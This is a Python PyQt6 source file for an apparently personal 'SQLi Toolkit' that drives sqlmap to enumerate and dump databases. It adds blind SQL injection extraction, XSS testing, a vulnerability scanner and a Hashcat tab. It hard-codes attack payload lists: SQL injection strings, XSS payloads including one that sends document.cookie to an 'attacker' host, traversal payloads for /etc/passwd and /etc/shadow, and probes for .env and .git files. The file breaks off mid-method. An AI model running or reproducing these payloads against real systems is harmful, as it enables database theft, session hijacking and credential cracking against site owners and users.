#!/usr/bin/env python3
"""
SQLi Toolkit - PyQt6 Edition
by Michael
"""

import sys, os, re, subprocess, threading, urllib.parse
from datetime import datetime

import json
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QLabel, QPushButton, QLineEdit, QTextEdit, QCheckBox,
    QComboBox, QRadioButton, QButtonGroup, QFrame, QScrollArea,
    QSplitter, QTreeWidget, QTreeWidgetItem, QFileDialog, QMessageBox,
    QSizePolicy, QHeaderView, QProgressBar, QListWidget, QListWidgetItem,
    QDialog, QDialogButtonBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QObject, pyqtSlot, QMetaObject
from PyQt6.QtGui import QFont, QColor, QPalette, QTextCursor, QKeySequence, QShortcut

try:
    import requests
    from bs4 import BeautifulSoup
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── 색상 ──────────────────────────────────────────────────
BG      = "#0d1117"
BG2     = "#161b22"
BG3     = "#21262d"
ACCENT  = "#00ff88"
ACCENT2 = "#ff6b35"
TEXT    = "#e6edf3"
TEXT_DIM= "#7d8590"
BORDER  = "#30363d"
RED     = "#ff4444"
YELLOW  = "#ffd700"
BLUE    = "#58a6ff"
PURPLE  = "#bc8cff"

# ── 페이로드 ──────────────────────────────────────────────
SQLI_ERRORS = [
    "sql","syntax","mysql","ora-","oracle","microsoft ole db","odbc",
    "jdbc","sqlite","postgresql","warning: pg_","column",
    "unclosed quotation","80040e14","mssql","sysobjects",
]
SQLI_PAYLOADS = [
    "'","''","' OR '1'='1'--","' OR 1=1--",
    "1' ORDER BY 1--","1' ORDER BY 99--",
    "' UNION SELECT NULL--","'; WAITFOR DELAY '0:0:3'--",
]
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    '"><img src=x onerror=alert(1)>',
]

XSS_COOKIE_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(document.cookie)>",
    "'><script>document.write(document.cookie)</script>",
    "<script>var i=new Image;i.src='http://attacker/?c='+document.cookie;</script>",
]

XSS_STORED_MARKERS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "alert('XSS')",
    "onerror=alert(1)",
    "onload=alert(1)",
]
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd","..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow","%2e%2e%2fetc%2fpasswd",
]
TRAVERSAL_SIGNS = ["root:x:","daemon:","[extensions]","for 16-bit app support"]
INFO_PATHS = [
    "/robots.txt","/sitemap.xml","/.git/config",
    "/admin/","/admin/login","/phpinfo.php","/.env",
    "/web.config","/WEB-INF/web.xml",
]

# ── 스타일 ────────────────────────────────────────────────
STYLE = f"""
QWidget {{
    background-color: {BG};
    color: {TEXT};
    font-family: 'Courier New', monospace;
    font-size: 12px;
}}
QMainWindow {{ background-color: {BG}; }}
QTabWidget::pane {{
    border: 1px solid {BORDER};
    background-color: {BG2};
}}
QTabBar::tab {{
    background-color: {BG3};
    color: {TEXT_DIM};
    padding: 8px 20px;
    border: none;
    font-weight: bold;
    font-size: 12px;
}}
QTabBar::tab:selected {{
    background-color: {ACCENT};
    color: {BG};
}}
QTabBar::tab:hover:!selected {{
    background-color: {BG2};
    color: {TEXT};
}}
QLineEdit {{
    background-color: {BG3};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    padding: 6px 8px;
    font-size: 12px;
    selection-background-color: {ACCENT};
    selection-color: {BG};
}}
QLineEdit:focus {{ border: 1px solid {ACCENT}; }}
QTextEdit {{
    background-color: {BG};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    font-size: 12px;
    selection-background-color: {ACCENT};
    selection-color: {BG};
}}
QTextEdit:focus {{ border: 1px solid {ACCENT}; }}
QPushButton {{
    background-color: {BG3};
    color: {TEXT};
    border: none;
    border-radius: 4px;
    padding: 8px 16px;
    font-weight: bold;
    font-size: 12px;
}}
QPushButton:hover {{ background-color: {BG2}; }}
QPushButton:pressed {{ background-color: {BG}; }}
QPushButton:disabled {{ color: {TEXT_DIM}; background-color: {BG3}; }}
QCheckBox {{
    color: {TEXT};
    spacing: 8px;
    font-size: 12px;
}}
QCheckBox::indicator {{
    width: 16px; height: 16px;
    border: 1px solid {BORDER};
    border-radius: 3px;
    background-color: {BG3};
}}
QCheckBox::indicator:checked {{
    background-color: {ACCENT};
    border-color: {ACCENT};
}}
QRadioButton {{
    color: {TEXT};
    spacing: 8px;
    font-size: 12px;
}}
QRadioButton::indicator {{
    width: 14px; height: 14px;
    border: 1px solid {BORDER};
    border-radius: 7px;
    background-color: {BG3};
}}
QRadioButton::indicator:checked {{
    background-color: {ACCENT};
    border-color: {ACCENT};
}}
QComboBox {{
    background-color: {BG3};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    padding: 5px 8px;
    font-size: 12px;
}}
QComboBox:focus {{ border: 1px solid {ACCENT}; }}
QComboBox::drop-down {{ border: none; width: 20px; }}
QComboBox QAbstractItemView {{
    background-color: {BG3};
    color: {TEXT};
    border: 1px solid {BORDER};
    selection-background-color: {ACCENT};
    selection-color: {BG};
}}
QScrollBar:vertical {{
    background: {BG3};
    width: 8px;
    border-radius: 4px;
}}
QScrollBar::handle:vertical {{
    background: {BORDER};
    border-radius: 4px;
    min-height: 20px;
}}
QScrollBar::handle:vertical:hover {{ background: {TEXT_DIM}; }}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0px; }}
QScrollBar:horizontal {{
    background: {BG3};
    height: 8px;
    border-radius: 4px;
}}
QScrollBar::handle:horizontal {{
    background: {BORDER};
    border-radius: 4px;
}}
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {{ width: 0px; }}
QSplitter::handle {{ background: {BORDER}; width: 1px; height: 1px; }}
QTreeWidget {{
    background-color: {BG};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    alternate-background-color: {BG3};
    font-size: 12px;
}}
QTreeWidget::item:selected {{
    background-color: {BG3};
    color: {ACCENT};
}}
QHeaderView::section {{
    background-color: {BG3};
    color: {ACCENT};
    border: none;
    padding: 6px;
    font-weight: bold;
}}
QFrame[frameShape="4"], QFrame[frameShape="5"] {{
    color: {BORDER};
}}
QLabel {{ background: transparent; }}
QScrollArea {{ border: none; background: transparent; }}
"""

def btn(text, color=ACCENT, text_color=BG, w=None, h=36):
    b = QPushButton(text)
    b.setStyleSheet(f"""
        QPushButton {{
            background-color: {color};
            color: {text_color};
            border: none; border-radius: 4px;
            padding: 8px 16px;
            font-weight: bold; font-size: 12px;
        }}
        QPushButton:hover {{ background-color: {color}dd; }}
        QPushButton:pressed {{ background-color: {color}99; }}
        QPushButton:disabled {{ background-color: {BG3}; color: {TEXT_DIM}; }}
    """)
    if w: b.setFixedWidth(w)
    if h: b.setFixedHeight(h)
    return b

def section_label(text, color=ACCENT):
    lbl = QLabel(text)
    lbl.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 13px; padding: 2px 0;")
    return lbl

def dim_label(text):
    lbl = QLabel(text)
    lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px;")
    return lbl

def sep():
    f = QFrame()
    f.setFrameShape(QFrame.Shape.HLine)
    f.setStyleSheet(f"color: {BORDER};")
    return f


# ── Worker 스레드 ─────────────────────────────────────────
class Worker(QObject):
    log     = pyqtSignal(str, str)   # text, tag
    done    = pyqtSignal(int)        # return code
    dbs     = pyqtSignal(list)
    tables  = pyqtSignal(list)
    cols    = pyqtSignal(list)
    dump    = pyqtSignal(str)

    def __init__(self, cmd, parse):
        super().__init__()
        self.cmd   = cmd
        self.parse = parse
        self._proc = None

    def run(self):
        lines = []
        try:
            self._proc = subprocess.Popen(
                self.cmd, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in self._proc.stdout:
                lines.append(line)
                self.log.emit(line, self._get_tag(line))
            self._proc.wait()
            rc = self._proc.returncode
        except FileNotFoundError:
            self.log.emit("\n[오류] sqlmap을 찾을 수 없어\npip install sqlmap\n", "error")
            rc = -1
        except Exception as e:
            self.log.emit(f"\n[예외] {e}\n", "error"); rc = -1

        full = "".join(lines)
        if   self.parse == "dbs":    self.dbs.emit(re.findall(r'\[\*\]\s+(\S+)', full) or re.findall(r'retrieved:\s+(\S+)', full))
        elif self.parse == "tables": self.tables.emit(re.findall(r'\|\s+(\w+)\s+\|', full) or re.findall(r'retrieved:\s+(\S+)', full))
        elif self.parse == "cols":   self.cols.emit(re.findall(r'\|\s+(\w+)\s+\|', full))
        elif self.parse == "dump":   self.dump.emit(full)
        self.done.emit(rc)

    def _get_tag(self, line):
        l = line.lower()
        if "[error]" in l or "[critical]" in l: return "error"
        if "[warning]" in l:  return "warn"
        if "retrieved:" in l or line.strip().startswith("[*]"): return "found"
        if "[info]" in l:     return "info"
        if line.strip().startswith("|"): return "info"
        return "dim"

    def stop(self):
        if self._proc: self._proc.terminate()


# ── 메인 윈도우 ───────────────────────────────────────────
class SQLiToolkit(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("⚡ SQLi Toolkit  //  by Michael")
        self.resize(1300, 880)

        self._worker     = None
        self._thread     = None
        self._blind_stop = False
        self._scan_stop  = False
        self._xss_stop   = False
        self._cookie_server = None
        self._stolen_data   = ("","","")
        self._hc_process    = None
        self._hc_hash_file  = None
        self._hc_cracked    = []
        self._hc_last       = None
        self._dump_cols  = []
        self._dump_rows  = []
        self.scan_results = []
        self.detected_params = []
        self.sqlmap_bin  = self._find_sqlmap()

        self._build_ui()

    def _save_options(self):
        """현재 설정 JSON으로 저장"""
        data = {
            "url":        self.url_entry.text(),
            "mode":       self.mode_grp.checkedId(),
            "post_data":  self.post_entry.text(),
            "db":         self.db_entry.text(),
            "table":      self.tbl_entry.text(),
            "extra":      self.extra_entry.text(),
            "sqlmap_bin": self.bin_entry.text(),
            "options":    {flag: cb.isChecked() for flag, cb in self.opt_vars.items()},
        }
        path, _ = QFileDialog.getSaveFileName(
            self, "옵션 저장",
            f"sqli_options_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON (*.json);;All (*.*)")
        if path:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            QMessageBox.information(self, "저장 완료", f"저장됨:\n{path}")

    def _load_options(self):
        """JSON에서 설정 불러오기"""
        path, _ = QFileDialog.getOpenFileName(
            self, "옵션 불러오기", "", "JSON (*.json);;All (*.*)")
        if not path: return
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            self.url_entry.setText(data.get("url", ""))
            self.post_entry.setText(data.get("post_data", ""))
            self.db_entry.setText(data.get("db", ""))
            self.tbl_entry.setText(data.get("table", ""))
            self.extra_entry.setText(data.get("extra", ""))
            self.bin_entry.setText(data.get("sqlmap_bin", self.sqlmap_bin))
            # 모드
            mode = data.get("mode", 0)
            btn = self.mode_grp.button(mode)
            if btn: btn.setChecked(True); self._on_mode_change()
            # 옵션 체크박스
            for flag, val in data.get("options", {}).items():
                if flag in self.opt_vars:
                    self.opt_vars[flag].setChecked(val)
            QMessageBox.information(self, "불러오기 완료", "설정이 적용됐어!")
        except Exception as e:
            QMessageBox.critical(self, "오류", f"불러오기 실패:\n{e}")

    def _find_sqlmap(self):
        for c in ["sqlmap", "/opt/homebrew/bin/sqlmap", "/usr/local/bin/sqlmap"]:
            try:
                r = subprocess.run([c,"--version"], capture_output=True, text=True, timeout=3)
                if r.returncode == 0: return c
            except Exception: pass
        return "sqlmap"

    def _build_ui(self):
        # 헤더
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        hdr = QWidget()
        hdr.setFixedHeight(52)
        hdr.setStyleSheet(f"background-color: {BG2}; border-bottom: 1px solid {BORDER};")
        hl = QHBoxLayout(hdr)
        hl.setContentsMargins(20, 0, 20, 0)
        title = QLabel("⚡  SQLi Toolkit")
        title.setStyleSheet(f"color: {ACCENT}; font-size: 20px; font-weight: bold;")
        sub = QLabel("sqlmap  |  Blind SQLi  |  XSS  |  취약점 스캐너")
        sub.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px;")
        self.status_lbl = QLabel("● IDLE")
        self.status_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 12px;")
        hl.addWidget(title)
        hl.addSpacing(12)
        hl.addWidget(sub)
        hl.addStretch()
        hl.addWidget(self.status_lbl)
        root.addWidget(hdr)

        # 메인 탭
        self.main_tab = QTabWidget()
        root.addWidget(self.main_tab)

        sqlmap_w = QWidget()
        scanner_w = QWidget()
        xss_w     = QWidget()
        hashcat_w = QWidget()
        self.main_tab.addTab(sqlmap_w,   "⚡  sqlmap")
        self.main_tab.addTab(xss_w,      "🎯  XSS")
        self.main_tab.addTab(scanner_w,  "🔍  취약점 스캐너")
        self.main_tab.addTab(hashcat_w,  "💀  Hashcat")

        self._build_sqlmap_tab(sqlmap_w)
        self._build_xss_tab(xss_w)
        self._build_scanner_tab(scanner_w)
        self._build_hashcat_tab(hashcat_w)

    # ══════════════════════════════════════════════════════
    #  sqlmap 탭
    # ══════════════════════════════════════════════════════
    def _build_sqlmap_tab(self, parent):
        layout = QHBoxLayout(parent)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(6)

        # 왼쪽 탭
        self.left_tab = QTabWidget()
        self.left_tab.setFixedWidth(390)
        layout.addWidget(self.left_tab)

        sqlmap_left = QWidget()
        blind_left  = QWidget()
        self.left_tab.addTab(sqlmap_left, "⚡  sqlmap")
        self.left_tab.addTab(blind_left,  "🕵  Blind SQLi")

        self._build_sqlmap_left(sqlmap_left)
        self._build_blind_left(blind_left)

        # 오른쪽
        right = QWidget()
        layout.addWidget(right, 1)
        self._build_sqlmap_right(right)

    def _build_sqlmap_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12, 8, 12, 8)
        lay.setSpacing(4)
        scroll.setWidget(inner)

        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.addWidget(scroll)

        # TARGET
        lay.addWidget(section_label("[ TARGET ]"))
        lay.addWidget(sep())

        # 모드
        mode_w = QWidget()
        mode_l = QHBoxLayout(mode_w)
        mode_l.setContentsMargins(0,0,0,0)
        self.mode_grp = QButtonGroup(self)
        self.rb_url  = QRadioButton("URL");  self.rb_url.setChecked(True)
        self.rb_post = QRadioButton("POST")
        self.rb_file = QRadioButton("파일(-r)")
        for i, rb in enumerate([self.rb_url, self.rb_post, self.rb_file]):
            self.mode_grp.addButton(rb, i)
            mode_l.addWidget(rb)
        mode_l.addStretch()
        lay.addWidget(mode_w)
        self.mode_grp.buttonClicked.connect(self._on_mode_change)

        lay.addWidget(dim_label("URL 또는 파일 경로"))
        self.url_entry = QLineEdit()
        self.url_entry.setPlaceholderText("http://192.168.x.x/page?id=1")
        lay.addWidget(self.url_entry)

        self.detect_btn = btn("🔎  파라미터 자동 탐지", PURPLE, "white")
        self.detect_btn.clicked.connect(self._auto_detect)
        lay.addWidget(self.detect_btn)

        lay.addWidget(dim_label("탐지된 파라미터"))
        self.param_combo = QComboBox()
        self.param_combo.currentIndexChanged.connect(self._on_param_select)
        lay.addWidget(self.param_combo)

        self.file_btn = btn("📂  요청파일 선택", BG3, TEXT_DIM)
        self.file_btn.clicked.connect(self._pick_file)
        self.file_btn.hide()
        lay.addWidget(self.file_btn)

        self.post_widget = QWidget()
        pl = QVBoxLayout(self.post_widget)
        pl.setContentsMargins(0,0,0,0)
        pl.addWidget(dim_label("POST 데이터"))
        self.post_entry = QLineEdit()
        self.post_entry.setPlaceholderText("user=test&pass=test")
        pl.addWidget(self.post_entry)
        self.post_widget.hide()
        lay.addWidget(self.post_widget)

        # 단계별
        lay.addSpacing(8)
        lay.addWidget(section_label("[ 단계별 실행 ]", BLUE))
        lay.addWidget(sep())

        self._add_step(lay, "STEP 1", "DB 목록 추출", BLUE,
                       "▶  DB 목록 조회  (--dbs)", self._run_dbs)
        self._add_step(lay, "STEP 2", "테이블 목록 추출", ACCENT,
                       "▶  테이블 조회  (--tables)", self._run_tables, has_db=True)
        self._add_step(lay, "STEP 3", "컬럼 목록 추출", YELLOW,
                       "▶  컬럼 조회  (--columns)", self._run_columns, has_tbl=True)

        # 컬럼 선택 박스
        col_box = QFrame()
        col_box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        col_lay = QVBoxLayout(col_box)
        col_lay.setContentsMargins(10,8,10,10)
        col_lay.setSpacing(4)
        col_hdr = QHBoxLayout()
        col_title = QLabel("덤프할 컬럼 선택  (비우면 전체)")
        col_title.setStyleSheet(f"color: {YELLOW}; font-weight: bold; font-size: 11px; border: none;")
        col_hdr.addWidget(col_title)
        sel_all_btn = QPushButton("전체")
        sel_all_btn.setFixedSize(50, 22)
        sel_all_btn.setStyleSheet(f"background:{BG2}; color:{TEXT_DIM}; border:none; border-radius:3px; font-size:10px;")
        sel_none_btn = QPushButton("해제")
        sel_none_btn.setFixedSize(50, 22)
        sel_none_btn.setStyleSheet(f"background:{BG2}; color:{TEXT_DIM}; border:none; border-radius:3px; font-size:10px;")
        col_hdr.addStretch()
        col_hdr.addWidget(sel_all_btn)
        col_hdr.addWidget(sel_none_btn)
        col_lay.addLayout(col_hdr)

        self.col_list = QListWidget()
        self.col_list.setFixedHeight(120)
        self.col_list.setSelectionMode(QListWidget.SelectionMode.MultiSelection)
        self.col_list.setStyleSheet(f"""
            QListWidget {{
                background: {BG}; color: {TEXT};
                border: 1px solid {BORDER}; border-radius: 4px;
                font-size: 11px;
            }}
            QListWidget::item {{ padding: 3px 6px; }}
            QListWidget::item:selected {{
                background: {ACCENT}; color: {BG};
            }}
        """)
        col_lay.addWidget(self.col_list)
        self.col_selected_lbl = QLabel("← STEP 3 완료 후 자동 반영")
        self.col_selected_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; border: none;")
        col_lay.addWidget(self.col_selected_lbl)

        sel_all_btn.clicked.connect(self.col_list.selectAll)
        sel_none_btn.clicked.connect(self.col_list.clearSelection)
        lay.addWidget(col_box)

        self._add_step(lay, "STEP 4", "데이터 덤프", ACCENT2,
                       "▶  데이터 덤프  (--dump)", self._run_dump,
                       note="선택된 컬럼만 덤프 (비우면 전체)")

        # 옵션
        lay.addSpacing(8)
        lay.addWidget(section_label("[ 옵션 ]"))
        lay.addWidget(sep())

        self.opt_vars = {}
        for flag, desc, default in [
            ("--batch","자동 Yes",True),
            ("--random-agent","랜덤 UA",False),
            ("--level=3","레벨 3",False),
            ("--risk=2","리스크 2",False),
            ("--threads=5","스레드 5",False),
        ]:
            cb = QCheckBox(f"{flag}  ─  {desc}")
            cb.setChecked(default)
            self.opt_vars[flag] = cb
            lay.addWidget(cb)

        lay.addSpacing(4)
        lay.addWidget(dim_label("쿠키 / 추가 플래그"))
        self.extra_entry = QLineEdit()
        self.extra_entry.setPlaceholderText('--cookie="PHPSESSID=xxx"')
        lay.addWidget(self.extra_entry)

        lay.addWidget(dim_label("sqlmap 경로"))
        self.bin_entry = QLineEdit(self.sqlmap_bin)
        lay.addWidget(self.bin_entry)

        # 옵션 저장/불러오기
        save_load_w = QWidget()
        sl_lay = QHBoxLayout(save_load_w)
        sl_lay.setContentsMargins(0,0,0,0)
        save_opt_btn = btn("💾  옵션 저장", BG3, ACCENT, h=32)
        load_opt_btn = btn("📂  옵션 불러오기", BG3, BLUE, h=32)
        save_opt_btn.clicked.connect(self._save_options)
        load_opt_btn.clicked.connect(self._load_options)
        sl_lay.addWidget(save_opt_btn)
        sl_lay.addWidget(load_opt_btn)
        lay.addWidget(save_load_w)

        lay.addSpacing(8)
        lay.addWidget(sep())
        self.stop_btn = btn("■  중지", RED, "white")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self._stop)
        lay.addWidget(self.stop_btn)
        lay.addStretch()

    def _add_step(self, lay, step, desc, color, btn_txt, cmd,
                  has_db=False, has_tbl=False, note=""):
        box = QFrame()
        box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        bl = QVBoxLayout(box)
        bl.setContentsMargins(10, 8, 10, 10)
        bl.setSpacing(4)

        lbl = QLabel(f"{step}  {desc}")
        lbl.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 12px; border: none;")
        bl.addWidget(lbl)

        if has_db:
            bl.addWidget(dim_label("DB 이름"))
            self.db_entry = QLineEdit()
            bl.addWidget(self.db_entry)
            self.db_combo = QComboBox()
            self.db_combo.currentTextChanged.connect(lambda v: self.db_entry.setText(v) if v else None)
            bl.addWidget(self.db_combo)
            bl.addWidget(dim_label("← STEP 1 완료 후 자동 반영"))

        if has_tbl:
            bl.addWidget(dim_label("테이블 이름"))
            self.tbl_entry = QLineEdit()
            bl.addWidget(self.tbl_entry)
            self.tbl_combo = QComboBox()
            self.tbl_combo.currentTextChanged.connect(lambda v: self.tbl_entry.setText(v) if v else None)
            bl.addWidget(self.tbl_combo)
            bl.addWidget(dim_label("← STEP 2 완료 후 자동 반영"))

        if note:
            bl.addWidget(dim_label(note))

        b = btn(btn_txt, color, "white" if color in (ACCENT2, RED, PURPLE, BLUE) else BG)
        b.clicked.connect(cmd)
        bl.addWidget(b)
        lay.addWidget(box)

    def _build_blind_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12, 8, 12, 8)
        lay.setSpacing(6)
        scroll.setWidget(inner)
        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0,0,0,0)
        outer.addWidget(scroll)

        # URL 박스
        url_box = QFrame()
        url_box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        ul = QVBoxLayout(url_box)
        ul.setContentsMargins(10,8,10,10)
        lbl = QLabel("🎯  대상 URL")
        lbl.setStyleSheet(f"color: {ACCENT}; font-weight: bold; font-size: 13px; border: none;")
        ul.addWidget(lbl)
        ul.addWidget(dim_label("파라미터 포함  예) http://x.x.x.x/page?keyword=1"))
        self.blind_url_entry = QLineEdit()
        self.blind_url_entry.setPlaceholderText("http://192.168.x.x/page?param=1")
        ul.addWidget(self.blind_url_entry)

        self.blind_detect_btn = btn("🔎  파라미터 자동 탐지", PURPLE, "white", h=32)
        self.blind_detect_btn.clicked.connect(self._blind_auto_detect)
        ul.addWidget(self.blind_detect_btn)

        ul.addWidget(dim_label("탐지된 파라미터"))
        self.blind_param_combo = QComboBox()
        self.blind_param_combo.currentIndexChanged.connect(self._blind_on_param_select)
        ul.addWidget(self.blind_param_combo)
        self.blind_detected_params = []

        lay.addWidget(url_box)

        lay.addWidget(dim_label("  sysobjects → syscolumns → 데이터  순서로 진행"))

        # 수동 페이로드 입력
        lay.addSpacing(4)
        blind_manual_box = QFrame()
        blind_manual_box.setStyleSheet(f"QFrame {{ background:{BG3}; border-radius:6px; border:1px solid {BORDER}; }}")
        bml = QVBoxLayout(blind_manual_box)
        bml.setContentsMargins(10,8,10,10); bml.setSpacing(4)
        bmt = QLabel("✏️  수동 페이로드 입력")
        bmt.setStyleSheet(f"color:{ACCENT}; font-weight:bold; font-size:12px; border:none;")
        bml.addWidget(bmt)
        bml.addWidget(dim_label("파라미터 선택"))
        self.blind_manual_param = QComboBox()
        self.blind_manual_param.setEditable(True)
        bml.addWidget(self.blind_manual_param)
        bml.addWidget(dim_label("페이로드 (SQL 쿼리)"))
        self.blind_manual_payload = QLineEdit()
        self.blind_manual_payload.setPlaceholderText("' AND 1=1--")
        bml.addWidget(self.blind_manual_payload)
        bml.addWidget(dim_label("HTTP 메서드"))
        blind_method_row = QHBoxLayout()
        self.blind_manual_method = QButtonGroup(self)
        brb_get  = QRadioButton("GET");  brb_get.setChecked(True)
        brb_post = QRadioButton("POST")
        self.blind_manual_method.addButton(brb_get, 0)
        self.blind_manual_method.addButton(brb_post, 1)
        blind_method_row.addWidget(brb_get); blind_method_row.addWidget(brb_post)
        blind_method_row.addStretch()
        bml.addLayout(blind_method_row)
        bml.addWidget(dim_label("POST 데이터 (GET이면 무시)"))
        self.blind_manual_post = QLineEdit()
        self.blind_manual_post.setPlaceholderText("param=PAYLOAD&other=value")
        bml.addWidget(self.blind_manual_post)
        b_blind_manual = btn("▶  전송 & 응답 확인", ACCENT, BG)
        b_blind_manual.clicked.connect(self._run_blind_manual)
        bml.addWidget(b_blind_manual)
        lay.addWidget(blind_manual_box)

        # Blind 1
        b1 = self._blind_box(lay, "① 테이블명 추출", PURPLE, "sysobjects  (xtype=U)")
        row = QHBoxLayout()
        row.addWidget(dim_label("최대글자수"))
        self.btbl_maxlen = QLineEdit("20"); self.btbl_maxlen.setFixedWidth(50)
        row.addWidget(self.btbl_maxlen)
        row.addSpacing(12)
        row.addWidget(dim_label("인덱스"))
        self.btbl_idx = QLineEdit("0"); self.btbl_idx.setFixedWidth(40)
        row.addWidget(self.btbl_idx)
        row.addStretch()
        b1.addLayout(row)
        b1.addWidget(dim_label("  0=첫번째, 1=두번째 테이블..."))
        self.btbl_progress = QLabel(""); self.btbl_progress.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.btbl_result   = QLabel("결과: "); self.btbl_result.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b1.addWidget(self.btbl_progress); b1.addWidget(self.btbl_result)
        b = btn("▶  테이블명 추출", PURPLE, "white"); b.clicked.connect(self._run_blind_table)
        b1.addWidget(b)

        # Blind 2
        b2 = self._blind_box(lay, "② 컬럼명 추출", BLUE, "syscolumns")
        b2.addWidget(dim_label("테이블"))
        self.bcol_tbl = QLineEdit(); b2.addWidget(self.bcol_tbl)
        row2 = QHBoxLayout()
        row2.addWidget(dim_label("최대글자수"))
        self.bcol_maxlen = QLineEdit("20"); self.bcol_maxlen.setFixedWidth(50); row2.addWidget(self.bcol_maxlen)
        row2.addSpacing(12)
        row2.addWidget(dim_label("컬럼인덱스"))
        self.bcol_idx = QLineEdit("0"); self.bcol_idx.setFixedWidth(40); row2.addWidget(self.bcol_idx)
        row2.addStretch(); b2.addLayout(row2)
        b2.addWidget(dim_label("  ① 결과를 테이블에 입력"))
        self.bcol_progress = QLabel(""); self.bcol_progress.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.bcol_result   = QLabel("결과: "); self.bcol_result.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b2.addWidget(self.bcol_progress); b2.addWidget(self.bcol_result)
        b = btn("▶  컬럼명 추출", BLUE, "white"); b.clicked.connect(self._run_blind_col)
        b2.addWidget(b)

        # Blind 3
        b3 = self._blind_box(lay, "③ Boolean 데이터 추출", ACCENT, "참/거짓 응답 차이로 추출")
        for lbl_txt, attr in [("테이블","blind_tbl_entry"),("컬럼","blind_col_entry"),("조건","blind_where_entry")]:
            b3.addWidget(dim_label(lbl_txt))
            e = QLineEdit()
            if lbl_txt == "조건": e.setPlaceholderText("예) adminid='admin'  (비워두면 TOP 1)")
            b3.addWidget(e); setattr(self, attr, e)
        row3 = QHBoxLayout()
        row3.addWidget(dim_label("최대글자수"))
        self.blind_maxlen_entry = QLineEdit("20"); self.blind_maxlen_entry.setFixedWidth(50); row3.addWidget(self.blind_maxlen_entry)
        row3.addStretch(); b3.addLayout(row3)
        self.bool_progress_lbl = QLabel(""); self.bool_progress_lbl.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.bool_result_lbl   = QLabel("결과: "); self.bool_result_lbl.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b3.addWidget(self.bool_progress_lbl); b3.addWidget(self.bool_result_lbl)
        b = btn("▶  Boolean Blind 추출", ACCENT, BG); b.clicked.connect(self._run_boolean_blind)
        b3.addWidget(b)

        # Blind 4
        b4 = self._blind_box(lay, "④ Time-based 데이터 추출", ACCENT2, "WAITFOR DELAY  (MS-SQL)")
        for lbl_txt, attr in [("테이블","time_tbl_entry"),("컬럼","time_col_entry"),("조건","time_where_entry")]:
            b4.addWidget(dim_label(lbl_txt))
            e = QLineEdit(); b4.addWidget(e); setattr(self, attr, e)
        row4 = QHBoxLayout()
        row4.addWidget(dim_label("딜레이(초)"))
        self.time_delay_entry = QLineEdit("2"); self.time_delay_entry.setFixedWidth(40); row4.addWidget(self.time_delay_entry)
        row4.addSpacing(12)
        row4.addWidget(dim_label("최대글자수"))
        self.time_maxlen_entry = QLineEdit("20"); self.time_maxlen_entry.setFixedWidth(50); row4.addWidget(self.time_maxlen_entry)
        row4.addStretch(); b4.addLayout(row4)
        self.time_progress_lbl = QLabel(""); self.time_progress_lbl.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.time_result_lbl   = QLabel("결과: "); self.time_result_lbl.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b4.addWidget(self.time_progress_lbl); b4.addWidget(self.time_result_lbl)
